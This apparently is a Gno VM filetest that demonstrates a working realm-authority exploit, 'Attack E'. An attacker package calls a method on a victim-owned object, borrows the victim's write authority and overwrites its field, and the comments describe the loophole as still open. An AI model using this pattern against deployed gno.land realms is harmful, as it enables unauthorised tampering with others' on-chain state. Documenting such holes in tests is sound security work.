// PKGPATH: gno.land/r/laundere
package laundere

// Attack E: /p/attack.TamperViaMethod wraps the receiver-borrow
// loophole. The body of TamperViaMethod calls o.Set(s) — Set is a
// /p/-method on the victim-stamped *Object receiver, so borrow rule 2
// switches m.Realm to laundervictim for the duration of Set. Inside
// Set, the write to o.Field runs with victim authority and succeeds.
//
// Known-open loophole. The /p/attack package is a thin wrapper
// around the underlying capability — any /p/ package that imports
// a /p/ type and re-dispatches through that type's methods inherits
// the exploit. The borrow rule grants victim authority because the
// receiver lives in victim's state.

import (
	"gno.land/p/demo/tests/launderattack"
	"gno.land/r/tests/vm/laundervictim"
)

func main(cur realm) {
	println("before:", laundervictim.ReadPtr())
	p := laundervictim.GetPtr()
	launderattack.TamperViaMethod(p, "pwnd-via-pattack-method")
	println("after: ", laundervictim.ReadPtr())
}

// Output:
// before: original-ptr
// after:  pwnd-via-pattack-method
